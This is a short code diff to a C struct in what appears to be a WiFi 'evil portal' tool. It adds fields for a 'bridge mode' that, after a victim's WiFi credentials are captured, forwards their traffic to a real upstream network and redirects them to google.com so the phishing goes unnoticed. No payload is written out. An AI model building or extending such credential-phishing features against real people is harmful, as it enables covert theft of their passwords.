@@ -158,6 +158,14 @@ struct WlanApp {
     char evil_portal_valid_ssid[33];
     char evil_portal_valid_pwd[65];
 
+    // Bridge Mode: after creds captured, switch to APSTA and forward client
+    // traffic to an upstream real WiFi network so the victim gets real
+    // internet. Replaces the static "Couldn't sign you in" page with a
+    // delayed redirect to google.com when enabled.
+    bool evil_portal_bridge_enable;
+    char evil_portal_bridge_ssid[33];
+    char evil_portal_bridge_password[65];
+
     // Lock-free Cred-Ring vom Evil-Portal-Callback gefüllt, von der Scene
     // im Tick gelesen.
     WlanAppEvilPortalCred evil_portal_cred_queue[WLAN_APP_EVIL_PORTAL_QUEUE_SIZE];
